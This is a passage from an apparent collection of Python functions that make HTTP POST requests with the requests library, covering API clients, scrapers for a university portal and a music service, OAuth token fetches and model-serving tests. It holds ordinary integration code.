            return None 
**************************************
def compare(self, primary, secondary, timeout = None):
        """
        Run BinDiff on the two BinDiff databases.
        :param primary: The first BinExport database
        :param secondary: The second BinExport database
        :param timeout: Timeout for the command in seconds
        :returns: The directory name of the directory with the generated data on the shared volume
        """

        url = "%s/compare" % next(self._urls)
        log.debug("curl -XPOST --form 'timeout=%s' --form '[email protected]%s' --form '[email protected]%s' '%s'", str(timeout), primary, secondary, url)
        response = requests.post(url, data = {"timeout": timeout}, \
                files = {"primary": open(primary, "rb"), "secondary": open(secondary, "rb")})

        if response.status_code == 200:
            handle, path = tempfile.mkstemp(suffix = ".bindiff.sqlite3")
            with os.fdopen(handle, "wb") as f:
                map(f.write, response.iter_content(1024))
            return path
        else:
            log.error("Bindiff server responded with status code %d: %s", response.status_code, response.content)
            return None 
**************************************
def apply_configuration():
    applyConfigurationResponse = requests.post(applyConfigurationURI, 
        headers={
            'Authorization': iotHubSasToken,
            'Content-Type': 'application/json'
        },
        data = get_config_file_contents()
    )

    print(applyConfigurationURI)
    print(applyConfigurationResponse.status_code)
    print(applyConfigurationResponse.text)

    if applyConfigurationResponse.status_code == 204:
        print("Configuration successfully applied.  Please run `docker logs edgeAgent -f` to see the change applied.")
    else:
        print("There was an error applying the configuration. You should see an error message above that indicates the issue.") 
**************************************
def convert_to_mp4(url):
    cached = check_pony_cache(url)
    if cached is not None:
        return cached
    print("Converting {} to mp4...".format(url))
    result = requests.post("https://api.imgur.com/3/image", {
        "image": url,
        "type": "URL"
    }, headers={
        'Authorization': 'Client-ID {}'.format(settings.IMGUR_TOKEN),
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    try:
        result.raise_for_status()
    except requests.HTTPError as e:
        print(e.response.content)
        return None
    mp4_url = result.json()['data'].get('mp4', None)
    if mp4_url is not None:
        cache_pony(url, mp4_url)
    return mp4_url 
**************************************
def sendToCityIO(data, endpoint=-1, token=None):
    config = get_config()
    if endpoint == -1 or endpoint == None:
        post_address = config['CITY_SCOPE']['TABLE_URL_RESULT_POST'] # default endpoint
    else:
        post_address = json.loads(config['CITY_SCOPE']['TABLE_URL_RESULT_POST_LIST'])[endpoint] # user endpoint

    if token is None:
        r = requests.post(post_address, json=data, headers={'Content-Type': 'application/json'})
    else: # with authentication
        r = requests.post(post_address, json=data, headers={'Content-Type': 'application/json', 'Authorization': 'Bearer '+token})
    print(r)
    if not r.status_code == 200:
        print("could not post result to cityIO", post_address)
        print("Error code", r.status_code)
    else:
        print("Successfully posted to cityIO", post_address, r.status_code)

# checks for updates on the cityIO grid
# If the grid changes the city-scope parser is called to create a new buildings.json
# The noise calculation is triggered 
**************************************
def __card_login(self):
        card_url = 'https://pass.neu.edu.cn/tpass/login?service=http://ecard.neu.edu.cn/selflogin/login.aspx'
        response = requests.get(card_url, cookies=self.pass_cookies, proxies=proxies['index'])

        data = {
            'username': re.findall("<input type=hidden name='username' id='username' value='(.*?)'/>", response.text)[
                0],
            'timestamp':
                re.findall("<input type=hidden name='timestamp' id='timestamp' value='(.*?)'/>", response.text)[0],
            'auid': re.findall("<input type=hidden name='auid' id='auid' value='(.*?)'/>", response.text)[0]
        }

        get_session = requests.post('http://ecard.neu.edu.cn/selfsearch/SSOLogin.aspx',
                                    cookies=response.cookies,
                                    data=data,
                                    headers=self.__headers,
                                    proxies=proxies['card'])

        self.card_cookies = {
            '.ASPXAUTSSM': get_session.history[0].cookies['.ASPXAUTSSM'],
            'ASP.NET_SessionId': response.cookies['ASP.NET_SessionId']
        }

    # 通过一网通办登陆教务处，私有方法 
**************************************
def borrow_info(self):
        post_url = 'https://portal.neu.edu.cn/tp_up/up/subgroup/getLibraryInfo'
        my_headers = {
            'Referer': 'https://portal.neu.edu.cn/tp_up/view?m=up',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
            'Origin': 'https://portal.neu.edu.cn',
            'Content-Type': 'application/json;charset=UTF-8'
        }
        response = requests.post(post_url,
                                headers=my_headers,
                                cookies=self.index_cookies,
                                data='{}',
                                proxies=proxies['index'])
        return response.json()


    # 卡是否挂失 
**************************************
def _get_song_lyrics(self, song):
        lyric_url = "https://music.163.com/weapi/song/lyric"
        raw_data = {
            "csrf_token": "",
            "id": song.id,
            "lv": -1,
            "tv": -1
        }
        post_data = get_encrypted_post_data(raw_data)
        r = requests.post(lyric_url, data=post_data, headers=self.headers)
        json_data = r.json()

        lyric = ""
        if "lrc" in json_data and "lyric" in json_data["lrc"]:
            lyric = json_data["lrc"]["lyric"]

        return lyric 
**************************************
def new_post(self, text):

        header = {
            "Content-Type": "application/json",
            "User-Agent" : self.UA,
            "X-Line-Mid" : self.mid,
            "x-lct" : self.channel_access_token,
        }

        payload = {
            "postInfo" : { "readPermission" : { "type" : "ALL" } },
            "sourceType" : "TIMELINE",
            "contents" : { "text" : text }
        }

        r = requests.post(
            "http://" + self.host + "/mh/api/v24/post/create.json",
            headers = header,
            data = json.dumps(payload)
        )

        return r.json() 
**************************************
def postPhoto(self,text,path):
        header = {
            "Content-Type": "application/json",
            "User-Agent" : self.UA,
            "X-Line-Mid" : self.mid,
            "x-lct" : self.channel_access_token,
        }

        payload = {
            "postInfo" : { "readPermission" : { "type" : "ALL" } },
            "sourceType" : "TIMELINE",
            "contents" : { "text" : text ,"media" :  [{u'objectId': u'F57144CF9ECC4AD2E162E68554D1A8BD1a1ab0t04ff07f6'}]}
        }
        r = requests.post(
            "http://" + self.host + "/mh/api/v24/post/create.json",
            headers = header,
            data = json.dumps(payload)
        )

        return r.json() 
**************************************
def like(self, mid, postid, likeType=1001):

        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct" : self.channel_access_token,
        }

        payload = {
            "likeType" : likeType,
            "activityExternalId" : postid,
            "actorId" : mid
        }

        r = requests.post(
            "http://" + self.host + "/mh/api/v23/like/create.json?homeId=" + mid,
            headers = header,
            data = json.dumps(payload)
        )

        return r.json() 
**************************************
def comment(self, mid, postid, text):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct" : self.channel_access_token,
        }

        payload = {
            "commentText" : text,
            "activityExternalId" : postid,
            "actorId" : mid
        }

        r = requests.post(
            "http://" + self.host + "/mh/api/v23/comment/create.json?homeId=" + mid,
            headers = header,
            data = json.dumps(payload)
        )

        return r.json() 
**************************************
def createAlbum(self,gid,name):
        header = {
                    "Content-Type": "application/json",
                    "User-Agent" : self.UA,
                    "X-Line-Mid" : self.mid,
                    "x-lct" : self.channel_access_token,
        }
        payload = {
                "type" : "image",
                "title" : name
        }
        r = requests.post(
            "http://" + self.host + "/mh/album/v3/album?count=1&auto=0&homeId=" + gid,
            headers = header,
            data = json.dumps(payload)
        )
        return r.json() 
**************************************
def querylanguage(auth):
    """Query user's language that's available on v2c."""
    default = 'en'

    r = requests.post(
        url=api_url.replace('index.php', 'api.php'),
        data={
            'action': 'query',
            'format': 'json',
            'meta': 'userinfo',
            'uiprop': 'options'
        },
        auth=auth
    )

    try:
        language = r.json()['query']['userinfo']['options']['language']
    except (NameError, KeyError):
        return default

    if not language:
        return default

    return language 
**************************************
def configAuthenticate(username, password):
	FACTORIOPATH = getFactorioPath()

	url = "https://auth.factorio.com/api-login"
	params = {'username': username, 'password': password, 'apiVersion': 2}


	if not os.path.isfile("%s/bin/x64/factorio" % (FACTORIOPATH) ):
		print("Could not find factorio at %s" % (FACTORIOPATH))
		sys.exit(1)


	print("Fetching token for %s" %  (username))
	myResponse = requests.post(url,data=params, verify=True)
	if(myResponse.ok):

	    jData = json.loads(myResponse.text)
	    print("Writing %s to settings.json" % (jData[0]))
	    
	else:
	  # If response code is not ok (200), print the resulting http error code with description
	    myResponse.raise_for_status()
	    sys.exit(1)
	

	try:
		with codecs.open(getSettingsFile(), 'r', encoding='utf-8') as settings_file:
			settingsJson = json.load(settings_file)
			settingsJson['token'] = jData[0]
			settingsJson['username'] = username
				


		with codecs.open("%s/config/settings.json" % (FACTORIOPATH), 'w', encoding='utf-8') as settings_file:
			json.dump(settingsJson, settings_file, indent=4)
	except Exception as e:
		print(e)
		print("Help! Can't deal with the settings file!") 
**************************************
def get_melting_temp(dna_sequence, oligo_concentration_uM,
                     pcr_settings='q5'):
    global IDT_COOKIE
    
    #@TODO: update this to use http://tmcalculator.neb.com/#!/ since its probably accounting for the salt concentration in the buffer
    
    if not IDT_COOKIE:
        r = requests.get('http://www.idtdna.com/calc/analyzer',allow_redirects=False)
        IDT_COOKIE = r.cookies['ASP.NET_SessionId']       
        
    headers = {"content-type":'application/json','Cookie':'ASP.NET_SessionId=%s'%IDT_COOKIE}
    
    idt_response = requests.post('https://www.idtdna.com/calc/analyzer/home/analyze',json={
        "settings": {
            "Sequence": dna_sequence,
            "NaConc": 0,
            "MgConc": 2,
            "DNTPsConc": 5, 
            "OligoConc": oligo_concentration_uM,
            "NucleotideType": "DNA"
        }
    }, verify=False
    ,headers=headers)    
    
    idt_response.raise_for_status()
    
    return idt_response.json()['MeltTemp'] 
**************************************
def post(self, *args, **kwargs):
        kwargs['method'] = 'post'
        return self.do(*args, **kwargs) 
**************************************
def _get_token(self):
        response = requests.post(self.AUTH_URL, data={'grant_type': 'client_credentials'}, auth=(self.id, self.secret))
        response.raise_for_status()
        return response.json()['access_token'] 
**************************************
def nli(self, text, cusid=None):
        response = requests.post(self.URL, params=self._gen_parameters('nli', text, cusid))
        response.raise_for_status()
        response_json = response.json()
        if response_json['status'] != 'ok':
            raise NliStatusError("NLI responded status != 'ok': {}".format(response_json['status']))
        else:
            nli_obj = response_json['data']['nli'][0]
            return self.intent_detection(nli_obj) 
**************************************
def _isAsthamaPump(self, imageWidth, imageHeight, imageString):
        result = {}
        coordinates = {}
        metadata = {}
        isPresent = False

        try :
            self._printLogs("Sending Image To DL Server...", "NORMAL")

            url = DL_SERVER_URL
            payload = {
                        "imageWidth"   : imageWidth,
                        "imageHeight"  : imageHeight,
                        "image_string" : base64.b64encode(imageString),
                        "imageID"      : self.imageNo2d
                        }
            headers = {'content-type': 'application/json'}

            res = requests.post(url, data=json.dumps(payload), headers=headers)
            result = res.json()
            self._printLogs("[*] Sent to  : " + str(url), "OKBLUE")
            self._printLogs("[*] Response : " + str(result), "OKBLUE")

        except Exception, err:
            self._printLogs("Error Found on connecting to server : " + str(err), "FAIL")
            self._printLogs("+", "LINE") 
**************************************
def get_token( client_id, secret ) :
    """Gets Authorizaton token to use in other requests."""
    auth_url  = 'https://auth-api.lexisnexis.com/oauth/v2/token'
    payload   = ( 'grant_type=client_credentials&scope=http%3a%2f%2f' 'oauth.lexisnexis.com%2fall' )
    headers   = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r         = requests.post( auth_url, auth=HTTPBasicAuth( client_id, secret ), headers=headers, data=payload )
    json_data = r.json()
    return json_data[ 'access_token' ] 
**************************************
def get_token( client_id, secret ) :
    """Gets Authorizaton token to use in other requests."""
    auth_url  = 'https://auth-api.lexisnexis.com/oauth/v2/token'
    payload   = ( 'grant_type=client_credentials&scope=http%3a%2f%2f' 'oauth.lexisnexis.com%2fall' )
    headers   = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r         = requests.post( auth_url, auth=HTTPBasicAuth( client_id, secret ), headers=headers, data=payload )
    json_data = r.json()
    return json_data[ 'access_token' ] 
**************************************
def execute(self, document, variable_values=None, timeout=None):
        query_str = print_ast(document)
        payload = {
            'query': query_str,
            'variables': variable_values or {}
        }

        data_key = 'json' if self.use_json else 'data'
        post_args = {
            'headers': self.headers,
            'auth': self.auth,
            'cookies': self.cookies,
            'timeout': timeout or self.default_timeout,
            data_key: payload
        }
        request = requests.post(self.url, **post_args)
        request.raise_for_status()

        result = request.json()
        assert 'errors' in result or 'data' in result, 'Received non-compatible response "{}"'.format(result)
        return ExecutionResult(
            errors=result.get('errors'),
            data=result.get('data')
        ) 
**************************************
def main():
    module = AnsibleModule(
      argument_spec = dict(
        host = dict(required=True),
        username = dict(required=True),
        password = dict(required=True)
      )
    )
    
    device = module.params.get('host')
    username = module.params.get('username')
    password = module.params.get('password')

    url='http://' + host + '/ins'
    switchuser=username
    switchpassword=password

    myheaders={'content-type':'application/json-rpc'}
    
    payload=[
      {
        "jsonrpc": "2.0",
        "method": "cli",
        "params": {
          "cmd": "show version",
          "version": 1.2
        },
        "id": 1
      }
    ]
    response = requests.post(url,data=json.dumps(payload), headers=myheaders,auth=(switchuser,switchpassword)).json()

    version = response['result']['body']['sys_ver_str']
    data = json.dumps({"version": version})
    module.exit_json(changed=False, msg=str(data)) 
**************************************
def add(self, db, **kwargs):
        db_data = db.data.copy()
        db_data["functions"] = _filter_functions(db.data["functions"], **kwargs)
        data = pickle.dumps(db_data)
        result = requests.post("{:s}/function".format(self.url), files = {"file": BytesIO(data)})
        if result.status_code != 200:
            raise RuntimeError("Request failed with status code {:d}".format(result.status_code)) 
**************************************
def find_raw(self, db, **kwargs):
        db_data = db.data.copy()
        db_data["functions"] = _filter_functions(db.data["functions"], **kwargs)
        data = pickle.dumps(db_data)
        result = requests.post("{:s}/function/find/raw".format(self.url), files = {"file": BytesIO(data)})
        if result.status_code == 200:
            return True
        elif result.status_code == 404:
            return False
        else:
            raise RuntimeError("Request failed with status code {:d}".format(result.status_code)) 
**************************************
def find_mnem(self, db, **kwargs):
        db_data = db.data.copy()
        db_data["functions"] = _filter_functions(db.data["functions"], **kwargs)
        data = pickle.dumps(db_data)
        result = requests.post("{:s}/function/find/mnem".format(self.url), files = {"file": BytesIO(data)})
        if result.status_code == 200:
            return True
        elif result.status_code == 404:
            return False
        else:
            raise RuntimeError("Request failed with status code {:d}".format(result.status_code)) 
**************************************
def main(args, env):
    response = requests.post("{:s}/whitelist".format(args.url), files = {"file": open(args.sample, "rb")})
    if response.status_code != 200:
        print("Server returned error {:d}: {:s}".format(response.status_code, response.content)) 
**************************************
def add_sample(self, paths):
        if isinstance(paths, str):
            paths = [paths]
        reply = requests.post("%s/job/%d/add_sample" % (self.url, self.id), files = [(path, open(path, "rb")) for path in paths[0].split(",")])
        if reply.status_code != 200:
            try:
                message = reply.json()["message"]
            except ValueError:
                message = reply.content
            raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message)) 
**************************************
def submit(self):
        reply = requests.post("%s/job/%d/submit" % (self.url, self.id))
        if reply.status_code != 200:
            try:
                message = reply.json()["message"]
            except ValueError:
                message = reply.content
            raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message)) 
**************************************
def create_job(self):
        reply = requests.post("%s/job" % self.url)
        if reply.status_code == 200:
            return Job(self.url, reply.json()["job"])
        else:
            try:
                message = reply.json()["message"]
            except ValueError:
                message = reply.content
            raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message)) 
**************************************
def find_station(self, search_term):

        LOG.debug("pre-alias search_term: " + search_term);
        search_term = self.apply_aliases(search_term)
        LOG.debug("aliased search_term: " + search_term);

        payload = { "query" : search_term }
        # get the response from the TuneIn API
        res = requests.post(base_url, data=payload, headers=headers)
        dom = parseString(res.text)
        # results are each in their own <outline> tag as defined by OPML (https://en.wikipedia.org/wiki/OPML)
        entries = dom.getElementsByTagName("outline")

        # Loop through outlines in the lists
        for entry in entries:
            # Only look at outlines that are of type=audio and item=station
            if (entry.getAttribute("type") == "audio") and (entry.getAttribute("item") == "station"):
                if (entry.getAttribute("key") != "unavailable"):
                    # stop the current stream if we have one running
                    if (self.audio_state == "playing"):
                        self.stop()
                    # Ignore entries that are marked as unavailable
                    self.mpeg_url = entry.getAttribute("URL")
                    self.station_name = entry.getAttribute("text")
                    # this URL will return audio/x-mpegurl data. This is just a list of URLs to the real streams
                    self.stream_url = self.get_stream_url(self.mpeg_url)
                    self.audio_state = "playing"
                    self.speak_dialog("now.playing", {"station": self.station_name} )
                    wait_while_speaking()
                    LOG.debug("Found stream URL: " + self.stream_url)
                    self.process = play_mp3(self.stream_url)
                    return

        # We didn't find any playable stations
        self.speak_dialog("not.found")
        wait_while_speaking()
        LOG.debug("Could not find a station with the query term: " + search_term) 
**************************************
def callback(request):
    body = json.loads(request.body)
    text = body['message']['text'].split(' ')
    token = None
    if len(text) > 1:
        token = text[1]

    bot_key = os.environ.get('TELEGRAM_API_KEY')
    chat_id = body['message']['chat']['id']

    try:
        notification = Notification.objects.get(channel='telegram', connect_token=token)
        notification.channel_id = chat_id
        notification.save()

        text = "Welcome to the MuN"
        send_message_url = f'https://api.telegram.org/bot{bot_key}/sendMessage?chat_id={chat_id}&text={text}'
        requests.post(send_message_url)

        return HttpResponse()
    except Notification.DoesNotExist:
        text = "Sorry, seems like the MuN is too far..."
        send_message_url = f'https://api.telegram.org/bot{bot_key}/sendMessage?chat_id={chat_id}&text={text}'
        requests.post(send_message_url)

        return HttpResponse() 
**************************************
def _client_wrapper(self, rpc_name, rpc_signature):
        def _rpc_call(*args, **kargs):
            for k,v in zip(rpc_signature.parameters, args):
                 kargs[k] = v
            res = requests.post("http://%s:%s/%s" % (self.ip, self.port, rpc_name), params=kargs)
            return res.json() if res.status_code == 200 else None
        return _rpc_call 
**************************************
def get_token_from_code(auth_code, redirect_uri):
    # Build the post form for the token request
    post_data = {'grant_type': 'authorization_code',
                 'code': auth_code,
                 'redirect_uri': redirect_uri,
                 'scope': ' '.join(str(i) for i in scopes),
                 'client_id': client_id,
                 'client_secret': client_secret}

    r = requests.post(token_url, data=post_data)
    try:
        return r.json()
    except:
        return 'Error retrieving token: {0} - {1}'.format(r.status_code, r.text) 
**************************************
def jenkins_post(url, config_xml):

    try:

        log.info('Posting data to jenkins: %s' % url)
        headers = {'Content-Type': 'text/xml'}
        auth = HTTPBasicAuth(jenkins_user, jenkins_pass)
        r = requests.post(url, verify=False, headers=headers, auth=auth, data=config_xml)
    
        if r.status_code == requests.codes.ok:
            log.info('Success: %s' % r.status_code)
            return r
        else:
            msg = 'There was an error posting to Jenkins: http_status_code={0}s,reason={1},request={2}'.format(r.status_code, r.reason, url)
            log.error(msg)
            raise Exception(msg)

    except Exception, e:
        msg = 'Failed to create jenkins conf job: {0}'.format(e)
        log.error(msg)
        raise Exception(msg) 
**************************************
def send(self, msg):
        payload = msg
        r = requests.post(self.url, data=json.dumps(payload))

        if (r.status_code == requests.codes.ok):
            print "FlowMod Succeeded - "+str(r.status_code)
        else:
            print "FlowMod Failed - "+str(r.status_code) 
**************************************
def demo__custom_identity_verify(identity_dict):
    """
    For CC98 identity verify

    :type identity_dict: dict
    """
    import hashlib
    import requests
    import config

    if 'cc98_username' not in identity_dict or 'cc98_password' not in identity_dict:
        return False

    try:
        pass_md5 = hashlib.md5()
        pass_md5.update(identity_dict['cc98_password'].encode())
        pass_md5 = pass_md5.hexdigest()
        if config.is_use_proxy:
            proxy = config.requests_proxies
        else:
            proxy = None
        r = requests.post('http://www.cc98.org/sign.asp', data={
            'a': 'i',
            'u': identity_dict['cc98_username'],
            'p': pass_md5,
            'userhidden': 2
        }, proxies=proxy)
        if r.text == '9898':
            return True
        else:
            return False
    except:
        return False


# Demo for Twitter 
**************************************
def test_decision_tree(self):
        from requests import post
        from os import system
        from pandas import DataFrame, read_json
        from sklearn.datasets import load_iris
        from sklearn.tree import DecisionTreeClassifier

        iris = load_iris()
        input_df = DataFrame(data=iris['data'], columns=iris['feature_names'])
        clf = DecisionTreeClassifier(max_depth=2)
        clf.fit(input_df.values, iris['target'])

        # convert classifier to Docker container
        from sklearn2docker.constructor import Sklearn2Docker
        s2d = Sklearn2Docker(
            classifier=clf,
            feature_names=iris['feature_names'],
            class_names=iris['target_names'].tolist(),
        )
        s2d.save(
            name="classifier",
            tag="iris",
        )

        # run your Docker container as a detached process
        system("docker run -d -p {}:5000 --name {} classifier:iris && sleep 5".format(self.port, self.container_name))

        # send your training data as a json string
        request = post("http://localhost:{}/predict/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(list(result), ['prediction'])
        self.assertGreater(len(result), 0)

        request = post("http://localhost:{}/predict_proba/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(list(result), ['setosa', 'versicolor', 'virginica'])
        self.assertGreater(len(result), 0) 
**************************************
def test_barebones_keras(self):
        from sklearn.datasets import load_iris
        from pandas import DataFrame
        from numpy import array
        from os import system
        from pandas import read_json
        from requests import post

        iris = load_iris()
        input_df = DataFrame(data=iris['data'], columns=iris['feature_names'])
        model = self.create_categorical_classification_model()
        X, Y = input_df.values, array(iris['target'])
        model.fit(X, Y)

        # convert classifier to Docker container
        from sklearn2docker.constructor import Sklearn2Docker
        s2d = Sklearn2Docker(
            classifier=model,
            feature_names=list(input_df),
            class_names=iris['target_names'].tolist(),
        )
        s2d.save(
            name="classifier",
            tag="keras",
        )

        # # run your Docker container as a detached process
        system("docker run -d -p {}:5000 --name {} classifier:keras && sleep 5".format(self.port, self.container_name))

        # send your training data as a json string
        request = post("http://localhost:{}/predict/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 1)
        self.assertEqual(len(result), len(input_df))

        request = post("http://localhost:{}/predict_proba/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 3)
        self.assertEqual(len(result), len(input_df)) 
**************************************
def _post(self):
        if self.data_type == "json":
            return requests.post(self.config['url'], json=self.data, headers=self.headers, timeout=10, proxies=self.proxy)
        elif self.data_type == "urlencoded":
            return requests.post(self.config['url'], data=self.data, headers=self.headers, timeout=10, proxies=self.proxy) 
**************************************
def track(self, page):
        url = 'https://ssl.google-analytics.com/collect'
        payload = {
            'v': 1,
            'tid': 'UA-23742434-4',
            'cid': self._get_visitorid(),
            't': 'screenview',
            'an': 'Lynda.com Kodi Addon',
            'av': self.version,
            'cd': page
        }

        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0'}
        r = requests.post(url, data=payload, headers=headers) 
**************************************
def __index_login(self):
        login_page = requests.get('https://pass.neu.edu.cn/tpass/login', proxies=proxies['index'])
        # 生成登录参数
        lt = re.findall("input type=\"hidden\" id=\"lt\" name=\"lt\" value=\"(.*?)\" />", login_page.text)[0]
        execution = re.findall("input type=\"hidden\" name=\"execution\" value=\"(.*?)\" />", login_page.text)[0]
        rsa = self.id + self.password + lt
        ul = len(self.id)
        pl = len(self.password)

        # JESESSIONID是一个必不可少的cookie
        self.pass_cookies['jsessionid_tpass'] = login_page.cookies['jsessionid_tpass']

        post_data = {
            'rsa': rsa,
            'ul': ul,
            'pl': pl,
            'lt': lt,
            'execution': execution,
            '_eventId': 'submit'
        }

        login_post = requests.post('https://pass.neu.edu.cn/tpass/login',
                                   headers=self.__headers,
                                   cookies=login_page.cookies,
                                   proxies=proxies['index'],
                                   data=post_data)
        for i in login_post.history:
            if 'CASTGC' in i.cookies:
                self.pass_cookies['CASTGC'] = i.cookies['CASTGC']
            if 'tp_up' in i.cookies:
                self.index_cookies = i.cookies
                self.success = True

    # 通过一网通办登录图书馆，私有方法 
**************************************
def card_info(self):
        res = requests.post('https://portal.neu.edu.cn/tp_up/up/subgroup/getCardMoney',
                            cookies=self.index_cookies,
                            headers=self.__headers,
                            data='{}',
                            proxies=proxies['index'])
        return res.json()

    # 校园网使用情况 
**************************************
def net_info(self):
        res = requests.post('https://portal.neu.edu.cn/tp_up/up/subgroup/getWlzzList',
                            cookies=self.index_cookies,
                            headers=self.__headers,
                            data='{}',
                            proxies=proxies['index'])
        return res.json()

    # 学生邮箱情况 
**************************************
def email_info(self):
        res = requests.post('https://portal.neu.edu.cn/tp_up/up/subgroup/getBindEmailInfo',
                            cookies=self.index_cookies,
                            headers=self.__headers,
                            data='{}',
                            proxies=proxies['index'])
        return res.json()

    # 获取报销情况 
**************************************
def mobile_info(self):
        post_url = 'https://portal.neu.edu.cn/tp_up/sys/uacm/profile/getMobileEmail'
        my_headers = {
            'Referer': 'https://portal.neu.edu.cn/tp_up/view?m=up',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
            'Origin': 'https://portal.neu.edu.cn',
            'Content-Type': 'application/json;charset=UTF-8'
        }
        response = requests.post(post_url,
                                 headers=my_headers,
                                 cookies=self.index_cookies,
                                 data='{}',
                                 proxies=proxies['index'])
        return response.json() 
**************************************
def get_course(self, school_year, semester):
        data = requests.post("https://portal.neu.edu.cn/tp_up/up/widgets/getClassbyUserInfo",
                            cookies=self.index_cookies,
                            headers={
                                'Accept':'application/json, text/javascript, */*; q=0.01',
                                'Content-Type': 'application/json;charset=UTF-8'
                            },
                            proxies=proxies['index'],
                            data='{"schoolYear":"%s","semester":"%s","learnWeek":"1"}'%(school_year,semester)).json()
        courses = []
        for i in range(len(data)):
            if data[i]['KKXND']!=school_year or data[i]['KKXQM']!=semester:
                continue
            not_have = True
            for j in courses:
                if j['name'] == data[i]['KCMC']:
                    is_have = False
                    if data[i]['JSXM'] not in j['teachers']:
                        j['teachers'].append(data[i]['JSXM'])
                    j['schedules'].append({
                        "weeks": self.__week_num(data[i]['SKZC']),
                        "day": int(data[i]['SKXQ']),
                        "section": [ section for section in range(int(data[i]['KKXQM']),  1+int(data[i]['KKXQM'])+int(data[i]['SKJC']))],
                        "classroom": data[i]['JXDD']
                    })
                    continue
            if not_have:
                courses.append({
                    "name": data[i]['KCMC'],
                    "teachers": [data[i]['JSXM']],
                    "schedules": [{
                        "weeks": self.__week_num(data[i]['SKZC']),
                        "day": int(data[i]['SKXQ']),
                        "section": [ section for section in range(int(data[i]['KKXQM']),  1+int(data[i]['KKXQM'])+int(data[i]['SKJC']))],
                        "classroom": data[i]['JXDD']
                    }]
                })
        return courses

    # 通过教务处获取课表以及课程信息，如果教务处限制外网访问将无法在外网使用，建议使用get_course 
**************************************
def lost_card(self, card_pwd, human_id):
        lost_page = requests.get('http://ecard.neu.edu.cn/selfsearch/User/UserLoss.aspx',
                                 cookies=self.card_cookies, headers=self.__headers)
        data = {
            '__VIEWSTATE': re.findall('id="__VIEWSTATE" value="(.*?)"', lost_page.text)[0],
            '__EVENTVALIDATION': re.findall('id="__EVENTVALIDATION" value="(.*?)"', lost_page.text)[0],
            'ctl00$ContentPlaceHolder1$txtPwd': card_pwd,
            'ctl00$ContentPlaceHolder1$txtIDcardNo': human_id,
            'ctl00$ContentPlaceHolder1$btnLoss': '挂  失'
        }
        response = requests.post('http://ecard.neu.edu.cn/selfsearch/User/UserLoss.aspx',
                                 data=data,
                                 cookies=self.card_cookies,
                                 headers=self.__headers,
                                 proxies=proxies['card'])
        return re.findall("showMsg\('(.*?)'\)", response.text)[0]

    # 登录校园网关，如果登录成功，返回ip 
**************************************
def get_songs(self, query, offset=0, count=DEFAULT_QUERY_NUM):
        if not query or len(query) == 0:
            return [], 0
        search_url = "https://music.163.com/weapi/cloudsearch/get/web"
        raw_data = {
            "csrf_token": "",
            "hlposttag": "</span>",
            "hlpretag": "<span class=\"s-fc7\">",
            # 最大为100
            "limit": "%s" % (count if count else NeteaseSongSpider.DEFAULT_QUERY_NUM),
            "offset": "%s" % offset,
            "s": query,
            "total": "true",
            "type": "1"
        }
        post_data = get_encrypted_post_data(raw_data)

        resp = requests.post(search_url, data=post_data, headers=self.headers)
        json = resp.json()
        result = []
        total_count = 0

        if "result" not in json or not json["result"] or "songs" not in json["result"]:
            return result, total_count

        for json_song in json["result"]["songs"]:
            result.append(parse_song(json_song))

        if "songCount" in json["result"]:
            total_count = json["result"]["songCount"]

        return result, total_count 
**************************************
def _get_song_url(self, song):
        url = "https://music.163.com/weapi/song/enhance/player/url"
        raw_data = {
            # "br": 128000,
            "br": 320000,   # 比特率
            "csrf_token": "",
            "ids": "[%s]" % song.id
        }
        post_data = get_encrypted_post_data(raw_data)
        r = requests.post(url, data=post_data, headers=self.headers)
        json_data = r.json()
        song_url = json_data["data"][0]["url"]

        return song_url 
**************************************
def sendSignedPostRequest(self, uri, data):
        r = requests.post(self.endpoint + uri, json=data, auth=self.auth)
        return r.json() 
**************************************
def token(self):
        """Cached authentication token"""
        if not self._token:
            self._token = requests.post(self.url,
                json.dumps({'id': 1, 'method': 'Authenticate', 
                    'params': {'API': 1, 'Password': self.password}, 
                    'jsonrpc': '2.0'}),
                verify=False).json()["result"]["Token"]
        return self._token 
**************************************
def request(self, method, params):
        """Execute authenticated request"""
        return requests.post(self.url, 
            json.dumps({'id': 1, 'method': method, 'params': params, 
                'jsonrpc': '2.0', 'Token': self.token}),
            verify=False
        ).json() 
**************************************
def data_Crawling(from_h,to_h,date_h,i_orgcity, i_dstCity):
    url = 'http://www.ceair.com/otabooking/flight-search!doFlightSearch.shtml?rand=0.9983412510479111'
    data ='searchCond={"tripType":"OW","adtCount":1,"chdCount":0,"infCount":0,"currency":"CNY","sortType":"a","segmentList":[{"deptCd":"'+from_h+'","arrCd":"'+to_h+'","deptDt":"'+date_h+'","deptCdTxt":"'+i_orgcity+'","arrCdTxt":"'+i_dstCity+'","deptCityCode":"'+from_h+'","arrCityCode":"'+to_h+'"}],"sortExec":"a","page":"0"}'
    try:
        resp1 = requests.post(url,data = data,headers = headers,timeout = 15)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h,i_orgcity, i_dstCity):
    url = 'http://www.ceair.com/otabooking/flight-search!doFlightSearch.shtml?rand=0.9983412510479111'
